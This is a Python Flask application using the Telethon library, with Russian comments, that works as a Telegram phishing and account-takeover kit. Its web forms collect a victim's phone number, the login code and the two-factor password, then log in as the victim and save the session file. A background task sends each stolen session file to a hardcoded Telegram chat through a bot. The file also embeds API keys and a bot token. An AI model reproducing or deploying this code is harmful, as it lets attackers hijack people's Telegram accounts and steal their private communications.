from flask import Flask, request, render_template, redirect, url_for
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import os
import asyncio
import threading

API_ID = 26006502
API_HASH = "9afc2208b8cec0afe06c9c2bc15b53e4"

BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"
CHAT_ID = 7440693813  # твой Telegram ID

os.makedirs("sessions", exist_ok=True)

app = Flask(__name__, template_folder="templates", static_folder="static")

loop = asyncio.new_event_loop()
bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)

sent_files = set()
clients = {}  # временные клиенты в памяти


async def send_new_sessions():
    while True:
        files = os.listdir("sessions")
        new_files = [f for f in files if f.endswith(".session") and f not in sent_files]
        for file_name in new_files:
            path = os.path.join("sessions", file_name)
            try:
                await bot.send_file(CHAT_ID, path, caption=f"Новый файл сессии: {file_name}")
                sent_files.add(file_name)
            except Exception as e:
                print(f"Ошибка при отправке файла {file_name}: {e}")
        await asyncio.sleep(60)


def start_loop():
    asyncio.set_event_loop(loop)
    bot.start(bot_token=BOT_TOKEN)
    loop.create_task(send_new_sessions())
    loop.run_forever()


threading.Thread(target=start_loop, daemon=True).start()


def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result()


async def create_and_connect_client(phone):
    # создаем временный клиент (сессия в памяти)
    client = TelegramClient(None, API_ID, API_HASH, loop=loop)
    await client.connect()
    await client.send_code_request(phone)
    clients[phone] = client
    return client


def save_client_to_file(phone, client):
    """После успешного логина переносим временную сессию в файл"""
    safe_phone = phone.replace('+', '').replace(' ', '').replace('(', '').replace(')', '')
    session_name = f"sessions/{safe_phone}"
    new_client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
    new_client.session = client.session
    new_client.session.save()


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        phone = request.form["phone"].strip()
        try:
            run_async(create_and_connect_client(phone))
            return render_template("index.html", stage="code", phone=phone)
        except Exception as e:
            return render_template("index.html", stage="phone", error=str(e))
    return render_template("index.html", stage="phone")


@app.route("/code", methods=["POST"])
def code():
    phone = request.form["phone"].strip()
    code = request.form["code"].strip()

    async def process():
        client = clients.get(phone)
        if not client:
            return "Сессия не найдена.", None
        try:
            await client.sign_in(phone=phone, code=code)

            # Сохраняем сессию только после успешного входа
            save_client_to_file(phone, client)

            return "Авторизация успешна! ✅", None
        except SessionPasswordNeededError:
            return None, "2FA"
        except PhoneCodeInvalidError:
            return None, "Неверный код."

    message, error = run_async(process())
    if error == "2FA":
        return render_template("index.html", stage="2fa", phone=phone)
    elif error:
        return render_template("index.html", stage="code", phone=phone, error=error)
    else:
        return redirect(url_for('success'))


@app.route("/password", methods=["POST"])
def password():
    phone = request.form["phone"].strip()
    password = request.form["password"].strip()

    async def process():
        client = clients.get(phone)
        if not client:
            return "Сессия не найдена."
        try:
            await client.sign_in(password=password)

            # Сохраняем сессию после 2FA
            save_client_to_file(phone, client)

            return "Авторизация через 2FA успешна! ✅"
        except Exception as e:
            return f"Ошибка авторизации: {e}"

    message = run_async(process())
    if "успешна" in message.lower():
        return redirect(url_for('success'))
    else:
        return render_template("index.html", stage="phone", error=message)


@app.route("/success")
def success():
    return render_template("success.html")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
